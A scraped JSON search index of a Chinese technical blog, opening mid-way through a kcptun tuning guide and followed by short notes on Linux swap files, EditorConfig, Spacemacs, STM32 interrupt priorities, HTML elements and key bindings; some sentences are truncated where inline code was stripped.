alt=\"params\" height=\"450px\"//p\n\n内置模式\n\n响应速度:     \nfast3   fast2   [fast]   normal   default        \n有效载荷比:     \ndefault   normal   [fast]   fast2   fast3       \n中间mode参数比较均衡，总之就是越快，包重传越激进。       \n更高级的 手动档 需要理解KCP协议，并通过 隐藏参数 调整，例如:\n -mode manual -nodelay 1 -resend 2 -nc 1 -interval 20\n\n搭配1. fast + FEC(5,5)\n搭配2. fast2 + FEC(10,3)\n搭配3. fast2 + FEC(0,0)\n\n默认profile参考: https://github.com/xtaci/kcptun/blob/master/client/main.goL248\n\n前向纠错\n\n前向纠错采用Reed Solomon纠删码, 它的基本原理如下： 给定n个数据块d1, d2,…, dn，n和一个正整数m， RS根据n个数据块生成m个校验块， c1, c2,…, cm。 对于任意的n和m， 从n个原始数据块和m 个校验块中任取n块就能解码出原始数据， 即RS最多容忍m个数据块或者校验块同时丢失。\n\n通过参数\n数据包发送顺序严格遵循: n个datashard紧接m个parityshard，重复。\n\n注意：为了发挥FEC最佳效果，设置 parityshard/(parity+datashard)   packet loss，比如5/(5+5)   30%\n\n 窗口调整\n\n两端参数必须一致的有:\n\ndatashard --前向纠错\nparityshard --前向纠错\nnocomp --压缩\nkey --密钥\ncrypt --加密算法\n\n其余为两边可独立设定的参数\n\n简易窗口自我调优方法：\n\n  第一步：同时在两端逐步增大client rcvwnd和server sndwnd;        \n  第二步：尝试下载，观察如果带宽利用率（服务器＋客户端两端都要观察）接近物理带宽则停止，否则跳转到第一步。\n\n注意：产生大量重传时，一定是窗口偏大了\n\n安全\n\n无论你上层如何加密，如果\n密码可以通过-key指定，也可以通过环境变量KCPTUNKEY指定。\n\n注意: \n附加密速度Benchmark：\n\nBenchmarkAES128-4      \t  200000\t     11182 ns/op\nBenchmarkAES192-4      \t  200000\t     12699 ns/op\nBenchmarkAES256-4      \t  100000\t     13757 ns/op\nBenchmarkTEA-4         \t   50000\t     26441 ns/op\nBenchmarkSimpleXOR-4   \t 3000000\t       441 ns/op\nBenchmarkBlowfish-4    \t   30000\t     48036 ns/op\nBenchmarkNone-4        \t20000000\t       106 ns/op\nBenchmarkCast5-4       \t   20000\t     60222 ns/op\nBenchmarkTripleDES-4   \t    2000\t    878759 ns/op\nBenchmarkTwofish-4     \t   20000\t     68501 ns/op\nBenchmarkXTEA-4        \t   20000\t     77417 ns/op\nBenchmarkSalsa20-4     \t  300000\t      4998 ns/op\n\n 内存控制\n\n路由器，手机等嵌入式设备通常对内存用量敏感，通过调节环境变量GOGC（例如GOGC=20)后启动client，可以降低内存使用。      \n参考：https://blog.golang.org/go15gc\n\nDSCP\n\nDSCP差分服务代码点（Differentiated Services Code Point），IETF于1998年12月发布了Diff-Serv（Differentiated Service）的QoS分类标准。它在每个数据包IP头部的服务类别TOS标识字节中，利用已使用的6比特和未使用的2比特，通过编码值来区分优先级。     \n常用DSCP值可以参考Wikipedia DSCP，至于有没有用，完全取决于数据包经过的设备。\n\n通过 \n注意：设置dscp不一定会更好，需要尝试。\n\n Snappy数据流压缩\n\n  Snappy is a compression/decompression library. It does not aim for maximum\n  compression, or compatibility with any other compression library; instead,\n  it aims for very high speeds and reasonable compression. For instance,\n  compared to the fastest mode of zlib, Snappy is an order of magnitude faster\n  for most inputs, but the resulting compressed files are anywhere from 20% to\n  100% bigger.\n\n  Reference: http://google.github.io/snappy/\n\n通过参数   提示: 关闭压缩可能会降低延迟。\n\n流量控制\n\n必要性: 针对流量敏感的服务器，做双保险。      \n\n  基本原则: SERVER的发送速率不能超过ADSL下行带宽，否则只会浪费您的服务器带宽。  \n\n在server通过linux tc，可以限制服务器发送带宽。   \n举例:  用linux tc限制server发送带宽为32mbit/s:\nroot@kcptun:~ cat tc.sh\ntc qdisc del dev eth0 root\ntc qdisc add dev eth0 root handle 1: htb\ntc class add dev eth0 parent 1: classid 1:1 htb rate 32mbit\ntc filter add dev eth0 protocol ip parent 1:0 prio 1 handle 10 fw flowid 1:1\niptables -t mangle -A POSTROUTING -o eth0  -j MARK --set-mark 10\nroot@kcptun:~#\n其中eth0为网卡，有些服务器为ens3，有些为p2p1，通过ifconfig查询修改。\n\nSNMP\n\n// Snmp defines network statistics indicator\ntype Snmp struct {\n\tBytesSent        uint64 // payload bytes sent\n\tBytesReceived    uint64\n\tMaxConn          uint64\n\tActiveOpens      uint64\n\tPassiveOpens     uint64\n\tCurrEstab        uint64\n\tInErrs           uint64\n\tInCsumErrors     uint64 // checksum errors\n\tInSegs           uint64\n\tOutSegs          uint64\n\tOutBytes         uint64 // udp bytes sent\n\tRetransSegs      uint64\n\tFastRetransSegs  uint64\n\tEarlyRetransSegs uint64\n\tLostSegs         uint64\n\tRepeatSegs       uint64\n\tFECRecovered     uint64\n\tFECErrs          uint64\n\tFECSegs          uint64 // fec segments received\n}\n\n使用观察\n 带宽计算公式\n\n在不丢包的情况下，有最大-rcvwnd 个数据包在网络上正在向你传输，以平均数据包大小avgsize计算，在任意时刻，有：     \n\n\t\tnetworkcap = rcvwndavgsize\n\n数据流向你，这个值再除以ping值(rtt)，等于最大带宽使用量。\n\n\t\tmaxbandwidth = networkcap/rtt = rcvwndavgsize/rtt\n\n举例，设rcvwnd = 1024, avgsize = 1KB, rtt = 400ms，则：\n\n\t\tmaxbandwidth = 1024  1KB / 400ms = 2.5MB/s ~= 25Mbps\n\n（注：以上计算不包括前向纠错的数据量）\n\n前向纠错是最大带宽量的一个固定比例增加：\n\n\t\tmaxbandwidthfec = maxbandwidth(datashard+parityshard)/datashard\n\n举例，设datashard = 10 , partiyshard = 3，则：\n\n\t\tmaxbandwidthfec = maxbandwidth  (10 + 3) /10 = 1.3maxbandwidth ＝ 1.3 * 25Mbps = 32.5Mbps\n\n故障排除\n\n  Q: 客户端和服务器端皆无   A: 连接客户端程序的端口设置错误。     \n\n  Q: 客户端有   A: 连接服务器的端口设置错误，或者被防火墙拦截。     \n\n  Q: 客户端服务器皆有   A: 上层软件的设定错误。     \n\n 免责申明\n\n用户以各种方式使用本软件（包括但不限于修改使用、直接使用、通过第三方使用）的过程中，不得以任何方式利用本软件直接或间接从事违反中国法律、以及社会公德的行为。软件的使用者需对自身行为负责，因使用软件引发的一切纠纷，由使用者承担全部法律及连带责任。作者不承担任何法律及连带责任。       \n\n对免责声明的解释、修改及更新权均属于作者本人所有。\n\n捐赠\n\n          \n\n 特别鸣谢\n\n  郑H立, 南东风, Li, 七七, 凌君, 昶，LesMiserables, KyOn, 噼里啪啦, 继斌, 小苍辛苦, Ken,\n  乔槁, 佳晨, 猪肉佬, lcx, 昊文, 冰峰, 凡, alex, 海豹叔叔, 奥姐, 张冰, 司成,\n  武子, 慎，Alex43211，Coxxs，荣，NeroNg，吴骁，定一，我不是林J\n\n好人一生平安!\n\n相关软件\n\nhttps://github.com/bettermanbao/openwrt-kcptun\nhttps://github.com/EasyPi/openwrt-kcptun\nhttps://github.com/kuoruan/luci-app-kcptun\nhttps://github.com/dfdragon/kcptungclient\n\n 参考资料\n\nhttps://github.com/skywind3000/kcp -- KCP - A Fast and Reliable ARQ Protocol.\nhttps://github.com/klauspost/reedsolomon -- Reed-Solomon Erasure Coding in Go.\nhttps://en.wikipedia.org/wiki/Differentiatedservices -- DSCP.\nhttp://google.github.io/snappy/ -- A fast compressor/decompressor.\nhttps://www.backblaze.com/blog/reed-solomon/ -- Reed-Solomon Explained.\nhttp://www.qualcomm.cn/products/raptorq -- RaptorQ Forward Error Correction Scheme for Object Delivery.\nhttps://en.wikipedia.org/wiki/PBKDF2 -- Key stretching.\nhttp://blog.appcanary.com/2016/encrypt-or-compress.html -- Should you encrypt or compress first?\nhttps://github.com/hashicorp/yamux -- Connection multiplexing library.\n10. https://tools.ietf.org/html/rfc6937 -- Proportional Rate Reduction for TCP.\n11. https://tools.ietf.org/html/rfc5827 -- Early Retransmit for TCP and Stream Control Transmission Protocol (SCTP).\n12. http://http2.github.io/ -- What is HTTP/2?\n13. http://www.lartc.org/LARTC-zhCN.GB2312.pdf -- Linux Advanced Routing \u0026 Traffic Control\n14. https://en.wikipedia.org/wiki/Noisy-channelcoding_theorem -- Noisy channel coding theorem","tags":null},{"location":"//blog.pytool.com/Post/流媒体/2016-02-29 服务器 流媒体开发技术","title":"流媒体服务器","text":"罗索实验室\n\n前端技术\n\n播放器\nvideojs 麦子\nFlowplayer-一款免费的WEB视频播放器\n\nnginx-rtmp-module","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/net","title":"golang中net包用法（一）","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/流媒体/2016-02-29 视频直播","title":"视频直播技术","text":"金山云Android采集推流SDK，支持美颜、美声、软硬编 、网络自适应、混音、混响、画中画\nhttps://github.com/william0wang/KSYStreamer_Android\n\n金山视频云","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 Visual Studio Code ","title":"文本编辑 Visual Studio Code","text":"– Visual Studio Code 的 Docker 插件\n\nAtom One Dark Syntax Theme","tags":null},{"location":"//blog.pytool.com/Linux/2016-01-01 Linux swap分区文件","title":"Linux 用文件作为Swap分区","text":"---\n由于未知原因，开发服务器没有配置swap（交换分区）。\n虽然有4GB物理内存撑场面，但还是架不住多个tomcat+jetty的啃食，服务器频频死机！\n这时候增加SWAP物理分区是不可能了，但我们可以通过增加swap文件的方式增加swap！\n\n1.使用dd命令创建一个指定大小的文档 将swap文件写在/var/swap！\n\ndd if=/dev/zero of=/swapfile bs=1M count=8096\n\n2.使用mkswap创建swap\n\nmkswap /swapfile\n\n3.通过swapon命令开启swap分区\n\nswapon /swapfile\n\n4.查看swap分区状况\n\nswapon -s  或 cat /proc/swaps  \n\n在/etc/fstab中增加如下语句：\nfile system mount point type  options dump pass\n/var/swap  swap  swap    defaults 0 0\n/swapfile                                 none            swap    sw              0       0\n\n  mount:   对于swap分区，这个域应该填写：none，表示没有挂载点。\n  type：   adfs、cifs、ext3、iso9660、kafs、minix、msdos、vfat、umsdos、proc、swap、 squashfs、nfs、ntfs、affs、ufs\n  options: defaults，它代表包含了选项rw,suid,dev,exec,auto,nouser和 async。\n\n5.如果不再需要swap，可以清理该分区，关闭swap\n\nswapoff /tmp/swap","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 editorconfig ","title":"文本编辑 editorconfig","text":"\nEditorConfig介绍\n\nroot = true\n\n[]\nindentstyle = space\t\t\t\t\t\t\t\t# tab space\nindentsize = 2\nendofline = lf \t\t\t\t\t\t\t\t\t\t# lf crlf cr\ncharset = utf-8\t\t\t\t\t\t\t\t\t\t\t# latin1 utf-8 utf-16be utf-16le\ntrimtrailingwhitespace = true\t\t\t# true false\ninsertfinalnewline = true\t\t\t\t\t# true false\n\n[.{c,cpp,h,java,php}]\nindentsize = 4\n\nTab indentation (no size specified)\n[Makefile]\nindentstyle = tab\n\n[{package.json,.yml}]\nindentstyle = space\nindentsize = 2\n\n    indentstyle：tab为hard-tabs，space为soft-tabs。\n    indentsize：设置整数表示规定每级缩进的列数和soft-tabs的宽度（译注：空格数）。如果设定为tab，则会使用tabwidth的值（如果已指定）。\n    tabwidth：设置整数用于指定替代tab的列数。默认值就是indentsize的值，一般无需指定。\n    endofline：定义换行符，支持lf、cr和crlf。\n    charset：编码格式，支持latin1、utf-8、utf-8-bom、utf-16be和utf-16le，不建议使用uft-8-bom。\n    trimtrailingwhitespace：设为true表示会除去换行行首的任意空白字符，false反之。\n    insertfinal_newline：设为true表明使文件以一个空白行结尾，false反之。\n    root：表明是最顶层的配置文件，发现设为true时，才会停止查找.editorconfig文件。\n\n匹配除/之外的任意字符串\n* \t匹配任意字符串\n? \t匹配任意单个字符\n[name] \t匹配name字符\n[!name] \t匹配非name字符\n{s1,s3,s3} \t匹配任意给定的字符串（0.11.0起支持）","tags":null},{"location":"//blog.pytool.com/Post/电商/2016-06-01 优秀项目","title":"跨境电商解决方案","text":"一个用react+nodejs实现的笔记本小应用\nhttps://github.com/KellyLy/react-note\n\nswagger-editor\n跨域问题\naccess-control-allow-origin: *","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 spacemacs 总结","title":"文本编辑 spacemacs","text":"ivy：\n去掉 [SPC SPC] counsel-M-x命令行中自动添加的^符号\n;; (setq ivy-initial-inputs-alist nil)\n\n(evil-global-set-key 'visual (kbd \"C-\") 'mc/mark-all-like-this-dwim)\n(evil-global-set-key 'visual (kbd \"M-\") 'mc/mark-all-symbols-like-this-in-defun)\n(evil-global-set-key 'visual (kbd \"C-\u003c\") 'mc/mark-previous-like-this)\n(evil-global-set-key 'visual (kbd \"C-  \") 'mc/mark-next-like-this)\n(evil-global-set-key 'visual (kbd \"C-M-\u003c\") 'mc/skip-to-previous-like-this)\n(evil-global-set-key 'visual (kbd \"C-M-  \") 'mc/skip-to-next-like-this)\n(evil-global-set-key 'visual (kbd \"C-S-SPC\") 'mc/skip-to-next-like-this)\n\n清空evil insert map\n在dotspacemacs/user-config加入以下代码：\n\n(setcdr evil-insert-state-map nil)\n(define-key evil-insert-state-map [escape] 'evil-normal-state)\n\n添加better-default， C-e 未生效\n(better-defaults :variables\n                 better-defaults-move-to-end-of-code-first t)\n\n(define-key evil-insert-state-map (kbd \"C-e\") 'mwim-end-of-code-or-line)\n(define-key evil-motion-state-map (kbd \"C-e\") 'mwim-end-of-code-or-line)\n;; vim\n\n(chinese :packages\n        :variables\n        ;;pangu-spacingchinese-enable-fcitx t\n        pangu-spacing-real-insert-separtor t ;;将空格加入 linux 到你的档案\n        ;;linux 或者有 fcitx-remote 才启用 fcitx 支持\n        chinese-enable-fcitx (or (spacemacs/system-is-linux) (executable-find \"fcitx-remote\"))\n        chinese-enable-youdao-dict t)\n(defun set-font (english chinese english-size chinese-size)\n  (set-face-attribute\n   'default nil :font (format \"%s:pixelsize=%d\" english english-size))\n  (dolist\n      (charset '(kana han symbol cjk-misc bopomofo))\n    (set-fontset-font\n     (frame-parameter nil 'font) charset (font-spec :family chinese :size\n                                                    chinese-size))))\n(when (spacemacs/system-is-mac)\n  (set-font \"PragmataPro\" \"Source Han Sans SC\" 18 20))\n\n(when (spacemacs/system-is-linux)\n  (set-font \"Source Code Pro\" \"Droid Sans Fallback\" 18 20))\n\n(shell :variables\n       shell-default-shell (if (spacemacs/system-is-linux) 'eshell 'eshell)\n       ;; shell-default-term-shell \"/usr/bin/zsh\"\n       shell-protect-eshell-prompt t\n       shell-default-height 35\n       shell-default-position 'bottom\n       )\n\n(restclient :variables\n           restclient-use-org t)\n\nprodigy\n\n(dash :variables helm-dash-docset-newpath \"~/.local/share/Zeal/Zeal/docsets/\")\n\n(deft :variables\n  deft-recursive t\n  deft-text-mode 'org-mode\n  deft-default-extension \"org\"\n  deft-directory \"~/org-notes/\"\n  deft-extensions '(\"org\" \"clj\" \"txt\" \"md\" )\n  )\n\n(org :variables\n     org-enable-github-support t\n     org-enable-bootstrap-support t\n     org-enable-reveal-js-support t)\n\nproject 添加排除目录\n  (setq projectile-globally-ignored-directories\n        (append '(\".svn\") projectile-globally-ignored-directories))\nranger 模式错误总结\nranger文件管理器\n(ranger :variables\n        ranger-header-func 'ranger-header-line\n        ranger-parent-depth 1        ;; 显示父目录\n        ranger-show-preview t        ;; 开启文件预览\n        ranger-show-literal nil      ;; 预览开启语法高亮\n        ranger-max-preview-size 1    ;; 仅小于1M启用预览\n        ranger-ignored-extensions '(\"mkv\" \"iso\" \"mp4\" \"png\" \"jpeg\" \"jpg\")\n        )\n\nS: 在当前目录下开启一个 shell\n\n没有创建Bookmark 导致的ranger不可用\nranger-mode: Symbol’s value as variable is void: bookmark-alist\nRanger 与 golden ratio 不兼容\nmy-quit-ranger: Symbol’s value as variable is void: golden-ratio-previous-enable\n\n(with-eval-after-load 'ranger\n    (progn\t\t    (progn\n (define-key ranger-normal-mode-map (kbd \"q\") 'ranger-close)))\t\t +    (define-key ranger-normal-mode-map (kbd \"q\") 'ranger-close)\n (define-key evil-normal-state-local-map (kbd \"SPC f j\") 'deer)))\n\n 常用快捷键设置\n ;; 行插入\n(global-set-key (kbd \"C-S-return\") 'evil-open-above)\n(global-set-key (kbd \"C-return\") 'evil-open-below)\n(with-eval-after-load 'lispy\n  (define-key lispy-mode-map (kbd \"C-return\") 'evil-open-below))\n;; 交换行\n(global-set-key (kbd \"C-up\") 'move-text-line-up)\n(global-set-key (kbd \"C-down\") 'move-text-line-down)\navy\n(use-package avy\n:init (setq avy-keys '(?j ?h ?k ?l ?f ?g ?d ?s ?u ?r ?n ?v ?i ?e ?o ?w))\n(setq avy-keys '(?a ?s ?d ?f ?j ?k ?l ;; home row keys\n                    ?w ?e ?r ?u ?i ?o ?g ?h ?x ?c ?v ?m ;; easy moves\n                    ?t ?n ?z ?p ;; harder moves\n                    ))\n:config (progn\n          (define-key evil-normal-state-map (kbd \"s\") 'avy-goto-char)\n          (define-key evil-normal-state-map (kbd \"f\") 'avy-goto-char)\n          (define-key evil-normal-state-map (kbd \"C-f\") 'avy-goto-char-2)\n        )\n)\n(use-package avy\n  :ensure t\n  :init\n  ;; Use more keys\n  (setq avy-keys (append (number-sequence ?a ?z) '(?ö ?ä)))\n  ;; Overlay the first character on top, but show the full path\n  :config\n  (define-key evil-motion-state-map (kbd \"SPC\") 'kluge-avy-goto-char)\n  (define-key evil-motion-state-map (kbd \"g SPC\") 'kluge-avy-goto-line))\n\n(use-package avy\n  :ensure t\n\n  :config\n  (setq avy-keys (string-to-list \"asdfjklqwecviopnmughr\"))\n  :bind ((\"C-'\"     . avy-goto-char-2)\n         (\"C-\\\"\"    . avy-goto-char-timer)\n         (\"C-c j ,\" . avy-pop-mark)))\n 如何修改emacs中关于单词的划分？\n查看分词表 C-h s\nhttp://emacs.stackexchange.com/questions/10195/word-delimiters-in-standard-syntax-table\n%';$()-=\nmodify-syntax-entry\nsyntax class\n\nwhitespace character        \n_   symbol constituent   符号组成\nw   word constituent     单词组成\n    (modify-syntax-entry ?[ \"w\")\n    (modify-syntax-entry ?] \"w\")\n'   expression prefix  \n    (modify-syntax-entry ?' \"'\")\n\n   comment starter             comment ender   注释\n    (modify-syntax-entry ?\\; \"\u003c\" st)\n    (modify-syntax-entry ?\\n \"  \" st)\n(   open delimiter character )   close delimiter character\n    (modify-syntax-entry ?^ \"($\")\n    (modify-syntax-entry ?$ \")^\")\n$   paired delimiter 配对分隔符\n  (modify-syntax-entry ?$ \"$\" text-mode-syntax-table)\n\n|   generic string delimiter\n!   generic comment delimiter\n@   inherit from standard-syntax-table\n\n.   punctuation character 标点符号\n\n\"   string quote character\n/   character quote character\n\\   escape character\n\n syntax table\n所有的分词表都继承standard-syntax-table\n(make-syntax-table 默认创建 standard-syntax-table.)\n查看分词表命令 describe-syntax (C-h s).\n\nparedit\n分割和连接（split \u0026 join）\n\n一个表分为两个表，一个字符串分割为两个字符串。这些在Paredit中是十分简单的。只需要在要分割的地方按下M-S。\n\n;;; 例子，将光标放在world前，按下M-S\n(hello world)\n(hello) (world)\n;;; 字符串的\n\"Hello,world\"\n\"Hello,\" \"world\"\n连接的我就不写了，快捷键是M-J。还有看到上面代码的注释了吧，我要写注释的时候就按M-;然后注释符自动就打出来了，Paredit就是这么酷。\n\n吞吐S表达式（Barfage \u0026 Slurpage）\n\n我觉得这简直就是Paredit的精髓，简直太好用了。吞掉右边的S表达式，C-)，吐出来C-}。对应的，吞掉左边的S表达式，C-(，吐出来C-{。\n\n(foo bar (baz) quux zot)\n;;; 把光标放到(baz)里面，先吞右边（C-)）后吞左边（C-(）\n(foo bar (baz quux) zot)\n(foo (bar baz quux) zot)\n;;; 吐：把光标放在(bar baz quux)中，先吐左边（C-{）后吐右边（C-}）\n(foo bar (baz quux) zot)\n(foo bar (baz) quux zot)\n跳出外围块\n\n这个不太好表达，就写个例子吧。就是下面这个样子的。\n\n(foo (let ((x 5))\n       (sqrt n)) bar)\n;;; 光标停留在(sqrt n)前面，按下M-r\n(foo (sqrt n) bar)\n\n;;; 再来一个\n(if (pre)\n    (then)\n    (otherwise))\n;;; 在(then)前面按M-r\n(then)","tags":null},{"location":"//blog.pytool.com/Hardware/2015-12-03 STM32-NVIC中断响应","title":"STM32_NVIC中断响应","text":"NVIC，中文名嵌套中断向量控制器，是Cortex-M3系列控制器内部独有集成单元，与CPU结合紧密，降低中断延迟时间并且能更加高效处理后续中断。举个例子，比如火车站买票，那些火车站的规章制度就是NVIC，规定学生和军人有比一般人更高优先级，它们则给你单独安排个窗口，同学与同学之间也有区别，那就是你也得排队，也就是你的组别（抢断优先级）和你的排队序号（响应优先级）决定你何时能买到票。\n\n抢断优先级，顾名思义，能再别人中断是抢占别人中断，实现中断嵌套。响应优先级则只能排队，不能抢在前面插别人的对，即不能嵌套。\n\nSTM32中指定优先级的寄存器为4位，其定义如下：\n\n第0组：所有4位用于指定响应优先级\n第1组：最高1位用于指定抢占式优先级，最低3位用于指定响应优先级\n第2组：最高2位用于指定抢占式优先级，最低2位用于指定响应优先级\n第3组：最高3位用于指定抢占式优先级，最低1位用于指定响应优先级\n第4组：所有4位用于指定抢占式优先级\n\n以上定义也称作中断优先级分组，相关内容在STM32固件库的misc.h文件中有详细定义。\n\n基础了解了就可以对中断进行操作了。\n\n第一步：使用void NVICPriorityGroupConfig(uint32t NVICPriorityGroup)函数对优先级分组配置。NVICPriorityGroup可以配置为\n\n    NVICPriorityGroup0 =  选择第0组\n        NVICPriorityGroup1 =  选择第1组\n        NVICPriorityGroup2 =  选择第2组\n        NVICPriorityGroup3 =  选择第3组\n        NVICPriorityGroup4 =  选择第4组\n\n例如：NVICPriorityGroupConfig(NVICPriorityGroup0)配置为0组。\n\n第二步：中断初始化结构体配置，结构体类型定义如下：\n\n    typedef struct\n        {\n          uint8t NVICIRQChannel;\n          uint8t NVICIRQChannelPreemptionPriority;  //抢断优先级\n          uint8t NVICIRQChannelSubPriority;  //响应优先级\n          FunctionalState NVICIRQChannelCmd;\n        } NVICInitTypeDef;\n\n例如：STM32外部中断0配置如下\n\n    EXTINVICInitStructure.NVICIRQChannel = EXTI0IRQn;\n        EXTINVICInitStructure.NVICIRQChannelPreemptionPriority = 1;  //抢占优先级别(0~1)\n        EXTINVICInitStructure.NVICIRQChannelSubPriority = 7;  //响应优先级别(0~7)\n        EXTINVICInitStructure.NVICIRQChannelCmd = ENABLE;\n\n第三步：中断初始化结构体初始化操作如下\n\n    NVICInit(\u0026EXTINVICInitStructure);\n\n第四步：开关总中断操作。在STM32中是通过改变CPU优先级来允许和禁止中断的。\n\n（1）   下面两个函数等效关闭总中断\n\n    void NVICSETPRIMASK(void)；\n        void NVICSETFAULTMASK(void)；\n\n（2）   下面两个函数等效开放总中断\n\n    void NVICRESETPRIMASK(void)；\n        void NVICRESETFAULTMASK(void)；\n\n（3）   常用操作是先关后开中断\n\n    NVICSETPRIMASK();     // Disable Interrupts\n        NVIC_RESETPRIMASK(); // Enable Interrupts\n\n两种类型函数要成对使用。","tags":null},{"location":"//blog.pytool.com/Reship/2015-09-17-sematic-html","title":"HTML 标签","text":"基础元素\n\nhtml\n\n 文档元数据\n\nbase:用来指定文档中所有相对路径的基础路径。一个文档只能包含一个base\nhead\nlink:指明当前文档和外部文档的关系。\nmeta:用来表示其它 文档元数据标签 不能表示的元数据。\nstyle\ntitle\n\n资源：\nhttp://www.w3.org/TR/html5/links.html\n\n内容块\n\naddress:给最近的祖先元素article 或 body 提供联系信息\narticle:表示自包含的内容，可单独发布，重用。可以是论坛帖子，文章，博客或是其它独立的内容。通常会包含一个 h1-h6 作为子元素\nbody\nfooter:代表最近的父级区块内容的页脚，用来展示作者、版权、相关文档链接\nheader:描述最近的父级区块，一组介绍性描述或导航信息。通常包含h1-h6\nh1...h6\nhgroup\nnav\nsection:通常包含h1-h6\n\n 文本内容\n\ndl-dt-dd:表示键值对，名词和解释\nul-ol-li\npre:表示预格式化(已排版)的内容\np\nhr\nmain:文档的主内容\nfigure:自包含内容，通常带有标题 figcaption 。通常是插图、图表、照片、代码\nfigcaption:通常是图表标题、图例、代码说明\ndiv\n\ninline text semantics\n\na\nbr\ntime\nabbr:缩写。其title属性的含义为所缩写的全称\ndfn:展示术语的定义。最近的父级块必须包含dfn元素指定的术语的定义。\n\ncite:引述元素（Citation Element）。引述的作品（书、文章、电影、歌曲、节目等）的标题。\nq: quote element。cite属性表示来源URL。短引用使用q，不需要分段。长引用使用blockquote。\n\ncode\nkbd: Keyboard Input Element 。用户输入内容/按键\nsamp:计算机输出\n\ni:用于技术名词 / 外文短语 / 虚构人物\nem:表示侧重点的强调\nb:表示某种需要引起注意却又没有其他额外语义的内容。用于：摘要中的关键词 / 评介中的产品名称 / 文章的开篇内容 \nstrong:表示内容的重要性\n\nsmall:用于：免责声明 / 许可证声明 / 注意事项\nu:表示用非文本进行的标注的内容。中文专名 / 拼写检查的错误内容\ns:表示不再准确或不再相关的内容\nmark:在引用的文字中使用，表示在当前文档中需要引起注意但原文中并没有强调的含义 (eg. 对一篇文章的分析中对原文的标注);表示与用户当前的行为相关的内容 (eg. 高亮显示搜索关键词)\n\nsubsup: Subscript Element \u0026\u0026 Superscript Element \nrubyrprtrtc:注音标识\nvar:表示数学表达式或编程上下文中的变量\nwbr:Word Break Opportunity。\n\nbdibdo\ndata\nspan\n\n 图片和多媒体\n\nimg\npicture\nmaparea:图片热点\naudio:音频\nvideo:视频\ntrack:为多媒体元素指定文本轨。格式为.vvt 文件 https://developer.mozilla.org/en-US/docs/Web/API/WebVideoTextTracksFormat\nsource:表示所在多媒体元素的可替代资源\n\n嵌入内容\n\nembed:外部应用或可交互内容的整合入口\niframe\nobject:通用外部资源\nparam:为 object 元素传递的参数\n\n 脚本\n\ncanvas\nnoscript\nscript\n\n标记更改\n表示对当前文档内容进行的增添与删改,用来记录文档的编辑历史:\n\ncite 属性指向对某个修改的说明文档的 URL\n\ndatetime 属性表示了修改发生的时间 (取值规范)\n\ndel\nins: Inserted Text\n\n 表格\n\ntable\nthead\ntbody\ntfoot\ncaption:表示所处的 table 的标题，通常是表格的第一个子元素。\nth\ntr\ntd\ncol\ncolgroup\n\n表单\n\nform\nlabel:可以和其它控件关联起来，通过for 属性或是将其它控件包裹起来\nbutton\ninput\ntextarea\n\nselect\noptgroup\noption\ndatalist\nfieldset:分组控件\nlegend:fieldset 的标题\n\noutput\nprogress\nmeter\n interactive elements\n\ndetails\ndialog\nmenu\nmenuitem\nsummary\n\nWeb Components\n\ncontent\nelement\nshadow\ntemplate\n\n资源：\n\nhttp://www.w3.org/TR/components-intro/\n\n 废弃元素\n\n参考链接：\n\nhttps://developer.mozilla.org/en-US/docs/Web/HTML/Element","tags":null},{"location":"//blog.pytool.com/Linux/2016-01-01 Linux 按键设置","title":"Linux按键设置","text":"---\nXorg (简体中文) - ArchWiki\u0026oldid=186764)\nExtra keyboard keys (简体中文) - ArchWiki)\n修改键盘键位 - CodeWeblog.com\nUbuntu 14.04 下通过 XKB 修改键盘映射, 实现自定义按键\n\n按键绑定\n  bindkey  查看所有绑定的快捷键\n  bindkey '^Z' fancy-ctrl-z # 绑定一个函数到快捷键上\n  ：先按下Ctrl+V,然后按下F12 .我们就可以得到F12的字符序列 ^\\[\\[24~。\n  【附】也可以使用showkey -a命令查看按键对应的字符序列。\n\n  Linux的一个特色就是其命令多而且功能强大, 频繁输入命令不仅麻烦而且工作量较大，虽然可以使用TAB进行  命令补足，或者使用aliase来简化某个命令的输入，但这并不能从根本上解决敲击键盘次数过多的问题。\n  可以把任何命令或命令的组合指定给键盘上的某个键，可以是Alt+[A-Z],\n  Ctrl-[A-Z], Alt+Shift+[A-Z], F1-F12, Ctrl-F[1-12], Alt-F[1-12], Alt+Shift+F[1-12]，还有更不可思议的是甚至还可以为功能键加上“参数”，这样你按下那个键的时候，它会等待你输入相应的参数，并根据不同的参数运行不同的命令。\n  当然，有一些热键会被终端所捕获，如常见的Ctrl-D/C/Q/Z等，不过没关系，可用的热键还多着呢！\n  定义热键的配置文件为：/etc/inputrc 或 ~/.inputrc，定义热键的格式如下：\n  \"热键对应的ASCII字符\"：\"执行的命令\"\n  其中热键对应的ASCII字符可以通过 \"先按Ctrl-V, 然后按热键\" 的方式来输入, 如Ctrl-G对应的字符为^G, Alt-P对应的字符为^[p, Ctrl-Alt-H对应的字符为^[^H.\n  可以用\\C来代替Ctrl，\\M来代替Alt, \\M-\\C来代替Alt-Ctrl, 如\\C-M = Ctrl-M, \\M-\\C-H = Alt-Ctrl-M. 另外还可以用\\e代表^[.\n  先来看一些基本的热键定义，(这里热键里的字母不区分大小写):\n  \"^[-\":\"su -\\C-M\" # 按Alt+- 执行su - 命令，末尾\\C-M表示输入完定义的命令后回车，也可以更简洁地用一个\\n来表示.\n  \"\\M-\\C-G\":\"gaim \u0026 \u0026  /dev/null \u0026\u0026 disown\\C-M\"\n  # 按Ctrl-Alt-g在当前shell打开gaim, 并脱离该shell独立运行，即：即使你退出了该shell， gaim也不会关闭\n  其他一些组合键可以根据自己的需要配置，偶就不多说了.\n  \n\n原理\n系统处理键盘输入：\n键盘中的一个按键被按下时，会产生一个“信号”(keycode)传给操作系统。\n操作系统得到这个信号之后，检查此信号对应的处理方法(keysym)。\n执行对应的处理方法\nkeycode: The keycode is the numeric representation received by the kernel when a key or a mouse button is pressed.\nkeysym : The keysym is the value assigned to the keycode.\n如，按下 a 产生 'keycode 38', 'keycode 38' 映射到 keysym 'a' 或 '0×61', 即 a 的ASCII码(97).\nThere are two types of key in keyboard: non modification keys and modification keys.\n\n键盘上的键位产生的keycode是不变的，键帽可以随意更换,keycode对应的keysym也是可以更改的。\nkeysym 可以用字母也可以用数字来表示(如 b 和 0x62 等价)\n每一个 keycode 对应一套 keysym\nlayer1 layer2 layer3\nkeycode keysym 